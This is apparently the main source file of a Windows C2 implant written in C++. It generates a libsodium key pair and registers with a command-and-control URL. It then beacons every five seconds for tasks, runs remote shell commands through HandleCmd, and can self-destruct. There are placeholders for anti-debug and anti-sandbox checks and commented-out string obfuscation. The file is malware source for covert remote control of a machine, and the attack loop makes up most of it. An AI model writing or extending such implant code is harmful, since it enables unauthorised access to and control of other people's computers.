#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <stdio.h>
#include <sodium.h>
#include <string.h>
#include <vector>
// #include "obfuscator/MetaString.h"
#include "rapidjson/rapidjson.h"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "crypto.h"
#include "httpclient.h"
#include "profile.h"
#include "implant.h"
#include "constants.h"
#include "debug.h"
#include "opcode.h"
#include "command.h"
#include "utils.h"
#include "handlers.h"

using namespace std;
// using namespace andrivet::ADVobfuscator;

MalleableProfile *currentProfile;

int main()
{
	if (sodium_init() < 0)
	{
		return 1;
	}

	// Anti Debug

	// Anti Sandbox

	string privKey;
	string pubKey;
	int status = createBase64KeyPair(&privKey, &pubKey);

	if (status != 0)
	{
		DEBUG_PRINTF("Error creating key pair, aborting\n");
		exit(1);
	}

	currentProfile = Register(C2_URL, pubKey, privKey);

	if (currentProfile == NULL)
	{
		DEBUG_PRINTF("Error registering, aborting\n");
		exit(1);
	}

	DEBUG_PRINTF("Implant ID: %s\n", currentProfile->implantId.c_str());

	// // do stuff with the response
	Sleep(1);

	PSIZE_T outSize = 0;

	// // Checkin loop
	while (TRUE)
	{
		// Sleep(currentProfile->sleep * 1000);
		Sleep(5000);
		Task *newTask = Checkin(C2_URL, currentProfile);
		if (newTask == NULL)
		{
			continue;
		}

		DEBUG_PRINTF("Task ID: %s\n", newTask->taskId.c_str());
		int opcode = newTask->opcode;
		bool success = false;
		DEBUG_PRINTF("Opcode: %d\n", opcode);
		if (opcode == OPCODE_CMD)
		{
			HandleCmd(newTask, currentProfile);
		}
		else if (opcode == OPCODE_SELFDESTRUCT)
		{
			SelfDestruct();
		}
	}
}
